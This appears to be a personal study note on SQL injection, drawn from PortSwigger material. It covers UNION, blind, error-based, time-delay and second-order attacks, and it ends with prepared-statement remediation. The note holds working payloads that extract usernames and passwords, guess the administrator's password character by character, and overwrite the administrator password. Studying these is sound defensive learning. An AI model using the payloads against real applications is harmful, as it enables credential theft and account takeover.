---
title: SQL Injection
categories: [Knowledge,Web]
tags: [Knowledge]
---

## Explanation

- Web security vulnerability that intefere queries that an application makes to its database.

### Retrieving hidden data

- Where you can modify a SQL query to return additional results.

### Subverting application logic

- where you can change a query to interfere with the application's logic.

### UNION attacks

- where you can retrieve data from different database tables.
- 2 key requirement
  - individual queries must return the same number of columns
  - data types of each column must be compatible
- things to consider
  - numbers of columns are being returned from original query
  - which columns returned from original query are suitable data type to hold the results from injected query

### Examining the database

- where you can extract information about the version and structure of the database.

### Blind SQL injection

- where the results of a query you control are not returned in the application's responses.
- using TRUE and FALSE statement to gain information.

### SQL injection in different contexts

- usually used to obfuscate attacks to bypass checks

### Second-order SQL injection

- also known as stored SQL injection
- store the SQL injection into database and trigger it with different HTTP request


## Example

- Easiest example is to always use `'` and look for any error mesasge

### Retrieving hidden data

- Example request: `https://insecure-website.com/products?category=Gifts'--`
- Example SQL query: `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
  - In SQL query, `--` is comment which mean anything after `--` will not be treated as SQL query.
- Example request: `https://insecure-website.com/products?category=Gifts'+OR+1=1--`
- Example SQL query: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
  - The example SQL query will return all Gifts products becase `1=1` is always true and `--` will ignore the remaining query
- **Only use the SQL TRUE statement on SELECT as others such as UPDATE or DELETE will modify the data in SQL**

### Subverting application logic

- Example SQL query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
  - The SQL query will only check for username `administrator` and `--` ignore the remaining SQL query

### UNION attacks

- Example SQL query: `SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--`
  - This allow the SQL query to return name and description from products tables and username and password from users tables in a new table of 2 columns

- Using ORDER BY payload to check columns:

```bash
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

- Using UNION SELECT payload to check columns: 

```bash
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

- Searching for useful data type columns

```bash
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- Retrieve data

```bash
' UNION SELECT username, password FROM users--
```

- Retrieve multiple value in single column

```bash
' UNION SELECT username || '~' || password FROM users--
```

### Examining the database

- Example SQL query: `SELECT * FROM v$version` (Oracle)
  - Check database version
- Example SQL query: `SELECT * FROM information_schema.tables`
  - List tables

### BLind SQL injection

- Conditional responses

```bash
…xyz' AND '1'='1
…xyz' AND '1'='2

# Getting each alphabelt of the password and check
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

- Error based SQL injection
- Enchanced from conditional responses: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
  - same result but adding `1/0` to trigger error to cause difference in HTTP response

- Extracting sensitive data via verbose SQL error messages
- Example : `CAST((SELECT example_column FROM example_table) AS int)`
- Result : `ERROR: invalid input syntax for type integer: "Example data"`

- Time delay

```bash
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

# If true then delay the time
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

- OAST techniques
- used when no any responses from the application
> will get back to this because now i dont understand 
{: .prompt-danger }


### SQL injection in different contexts

- Example below uses XML escape sequence to encode S

```bash
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

### Second-order SQL injection

- register a SQL injection query as username: `a'; update users set password='letmein' where user='administrator'--`
- load the username in anyplace such as profile.
- the query will then trigger and change the password for administrator.

## Remediation

- Dont do this (vulnerable to SQL injection)

```bash
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

- Do this instead (protected from SQL injection)

```bash
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

## Useful Links

- [PortSwigger SQL injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger SQL injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)